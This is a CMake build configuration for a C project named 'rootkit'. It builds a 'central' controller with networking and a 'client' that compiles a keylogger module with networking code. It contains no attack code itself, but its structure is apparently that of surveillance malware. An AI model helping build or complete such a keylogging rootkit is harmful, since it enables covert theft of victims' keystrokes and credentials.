cmake_minimum_required(VERSION 3.10)
project(rootkit C)

set(CMAKE_C_STANDARD 17)

# Central executable
add_executable(central
        central/main.c
        central/menu/menu.c
        central/utils/utils.c
        central/networking/protocol.c
        central/networking/networking.c)

target_include_directories(central PRIVATE
        ${CMAKE_SOURCE_DIR}/central/menu
        ${CMAKE_SOURCE_DIR}/central/utils
        ${CMAKE_SOURCE_DIR}/central/networking)


add_executable(client
        client/main.c
        client/keylogging/keylogger.c
        client/utils/utils.c
        client/networking/networking.c
        client/networking/protocol.c)

target_include_directories(client PRIVATE
        ${CMAKE_SOURCE_DIR}/client
        ${CMAKE_SOURCE_DIR}/keylogging
        ${CMAKE_SOURCE_DIR}/networking
        ${CMAKE_SOURCE_DIR}/utils
        ${CMAKE_SOURCE_DIR}/watcher)